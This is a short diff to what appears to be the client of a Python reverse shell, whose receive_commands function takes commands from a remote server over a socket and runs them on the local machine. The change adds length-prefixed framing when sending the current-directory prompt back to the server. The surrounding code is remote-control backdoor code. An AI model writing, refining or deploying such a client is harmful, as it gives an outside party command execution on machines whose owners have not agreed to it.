@@ -35,7 +35,8 @@ def socket_connect():
 # Receive commands from remote server and run on local machine
 def receive_commands():
     data = s.recv(10)
-    s.send(str.encode(str(os.getcwd()) + '> '))
+    cwd = str.encode(str(os.getcwd()) + '> ')
+    s.send(struct.pack('>I', len(cwd)) + cwd)
     while True:
         data = s.recv(20480)
         if data[:2].decode("utf-8") == 'cd':
